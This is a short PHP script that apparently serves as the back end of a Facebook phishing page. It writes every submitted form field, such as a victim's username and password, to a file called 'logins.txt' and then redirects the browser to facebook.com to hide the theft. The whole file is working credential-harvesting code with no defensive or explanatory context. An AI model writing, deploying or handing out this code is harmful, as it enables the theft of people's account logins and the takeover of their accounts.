<?php
	header('location: https://www.facebook.com');
	$handle = fopen("logins.txt", "a");
	foreach($_POST as $variable => $value){
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);
	exit;
?>
